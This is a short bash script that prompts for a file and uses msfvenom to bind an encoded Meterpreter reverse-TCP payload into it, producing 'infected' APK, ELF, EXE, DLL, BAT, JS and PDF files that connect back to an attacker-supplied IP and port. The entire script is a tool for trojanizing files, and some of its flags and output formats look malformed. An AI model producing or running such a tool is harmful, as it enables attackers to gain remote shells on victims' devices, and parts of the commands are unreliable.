#!/bin/bash

# Prompt the user for the file path or name
echo "Enter the path or name of the file you want to infect (e.g. /path/to/file or file):"
read file

# Check if the user provided a path or just a file name
if [[ $file == */* ]]; then
  file_path=$file
else
  file_path="./$file"
fi

# Detect the file extension
ext="${file_path##*.}"

# Use MSFVenom to create the reverse shell payload with an encoder
if [[ $ext == "apk" ]]; then
  msfvenom -a android -x $file_path -e x86/shikata_ga_nai -i 5 -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f apk -o infected_file.apk
elif [[ $ext == "elf" ]]; then
  msfvenom -a linux -x $file_path -e shikata_ga_nai -i 5 -platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o infected_file.elf
elif [[ $ext == "pdf" ]]; then
  msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -e x86/shikata_ga_nai -f pdf -o infected_file.pdf
elif [[ $ext == "exe" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o infected_file.exe
elif [[ $ext == "dll" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f dll -o infected_file.dll
elif [[ $ext == "bat" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f bat -o infected_file.bat
elif [[ $ext == "js" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f js -o infected_file.js
else
  echo "Unsupported file extension: $ext"
  exit 1
fi
